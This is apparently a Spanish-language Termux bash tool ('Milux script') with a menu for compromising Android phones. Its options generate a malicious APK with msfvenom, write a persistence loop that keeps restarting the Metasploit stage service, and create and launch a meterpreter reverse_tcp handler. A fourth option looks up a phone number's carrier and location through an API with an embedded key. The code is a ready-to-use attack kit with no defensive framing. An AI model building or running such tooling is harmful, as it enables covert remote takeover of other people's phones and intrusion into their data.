#!/data/data/com.termux/files/usr/bin/bash

#colors
C='\033[1;36m'
G='\033[1;32m'
R='\033[1;31m'
Y='\033[1;33m'
B='\033[1;34m'
P='\033[1;35m'
RE='\033[0m'


#banner
function banner {
echo '             /|  |\            /|  |\
             /|  |\            /|  |\
            / |  | \          / |  | \
            | |  | |          | |  | |
            \  \/  /  __  __  \  \/  /
             \    /  / /  \ \  \    /
              \  /   \ \__/ /   \  /
              \  /   /      \   \  /
             _ \ \__/ O    O \__/ / _
             \\ \___          ___/ /
           _  \\___/  ______  \___//  _
           \\  ----(          )----  //
            \\_____( ________ )_____//
             ~-----(          )-----~ _
              _____( ________ )_____  \\
             /,----(          )----  _//
            //     (  ______  )     /  \
            ~       \        /      \  /
                     \  __  /       / /
                      \    /       / /
                       \   \      / /
                        \   ~----~ /
                         \________/' 
}
while [ option != � ]; do
setterm -foreground green
banner
echo -e $RE "Milux script v2.1"
setterm -foreground white
DEFAULT=/sdcard
echo -e $C "
$G[$RE 1$G ]$Y Crear un payload con msfvenom $RE
$G[$RE 2$G ]$Y Crear un persistencia para android. $RE
$G[$RE 3$G ]$Y Crear archivo de configuracion e iniciar msfconsole.$RE
$G[$RE 4$G ]$Y Obtener informacion de un telefono $RE

$G[$RE 0$G ]$Y Salir. $RE
"
read -p "=>> " option
if [ $option = 1 ]; then
	function genpayload {
clear
banner
echo -e  $R"[*]$G Ingresa tu LHOST $RE"
read -p "=>> " lhost
clear
banner
echo
echo -e  $R"[*]$G Ingresa tu LPORT $RE"
read -p "=>> " lport
clear
banner
echo
echo -e  $R"[*]$G Ingresa que payload a utilizar $RE"
read -p "=>> " payload
clear
banner
echo
echo -e  $R"[*]$G Ingresa el nombre de tu payload sin .apk $RE"
read -p "=>> " name
clear
banner
echo
clear
banner
echo
echo -e $R"[*]$G Estos son los datos ingresados. $RE
"
echo -e $G"[\033[0m*$G]$Y $lhost $RE"
sleep 1
echo -e $G"[\033[0m*$G]$Y $lport $RE"
sleep 1
echo -e $G"[\033[0m*$G]$Y $payload $RE"
sleep 1
echo -e $G"[\033[0m*$G]$Y $name.apk $RE
"
sleep 1
echo -e $R"[*]$G Todo esta correcto? y/n $RE
"
read -p "=>> " correcto
if [ "$correcto" = "y" ]; then
echo -e $R"[*]$G Espera por favor.. $RE"
sleep 3
msfvenom -p $payload $lhost $lport R > $DEFAULT/$name.apk 
clear
banner
echo
echo -e  $R"[*]$G LHOST.. ok $RE"
sleep 2
echo -e  $R"[*]$G LPORT.. ok $RE"
sleep 2
echo -e  $R"[*]$G Se ha generado con exito en $DEFAULT/$name.apk $RE
ENTER para continuar."
read enter
clear
else
	genpayload
fi }

 genpayload

elif [ $option = 2 ];then
	clear
setterm -foreground green
	banner
	echo -e '#!/bin/bash\nwhile\ndo am startservice com.metasploit.stage/.MainService\nsleep 20\ndone' > /sdcard/persistencia.sh
	echo -e $R"[*]$G Generando.."
	sleep 3
	echo -e $R"[*]$G Generado con exito! en /sdcard/persistencia.sh $RE
	ENTER para continuar."
	read enter

elif [ $option = 3 ];then
	clear
	banner
	echo
	echo -e $R"[*]$G Ingresa lhost"
	read -p "=>> " lhost
	echo -e $R"[*]$G Ingresa lport"
	read -p "=>> " lport
	echo -e $R"[*]$G Generando.."
	echo -e "use multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost $lhost\nset lport $lport\nrun" > conf.rc
	sleep 3
	echo -e $R"[*]$G Generado con exito $RE
	ENTER para conrinuar e iniciar"
	read enter
	msfconsole -r conf.rc
elif [ $option = 4 ]; then
	phone() {

if [[ -e phoneinfo.txt ]]; then
rm -rf phoneinfo.txt
fi

read -p $'\e[1;92m[*] Telefono (ejemplo: +528331234567): \e[0m' phone

api=c66a79fdb0c47e53109d077849cdcdd3

getphone=$(curl -s "apilayer.net/api/validate?access_key=$api&number='$phone'&country_code=&format=1" -L > phoneinfo.txt)

valid=$(grep -o 'valid\":true' phoneinfo.txt )
if [[ $valid == *'valid":true'* ]]; then
                                                                                          country=$(grep 'country_name\":\"' phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"')
location=$(grep 'location\":\"' phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"')
carrier=$(grep 'carrier\":\"' phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"')
line_type=$(grep 'line_type\":\"' phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"')
IFS=$'\n'
printf "\e[1;92m[*] Pais:\e[0m\e[1;77m %s\e[0m\n" $country
printf "\e[1;92m[*] Ubicacion:\e[0m\e[1;77m %s\e[0m\n" $location
printf "\e[1;92m[*] Operador:\e[0m\e[1;77m %s\e[0m\n" $carrier
printf "\e[1;92m[*] Tipo de Linea:\e[0m\e[1;77m %s\e[0m\n" $line_type

else
printf "\e[1;93m[!] Formato Incorrecto!\e[0m\n"
fi

}
clear
banner
echo
phone
echo -e $RE"ENTER para continuar."
read enter

elif [ $option = 0 ];then
	exit
fi
done
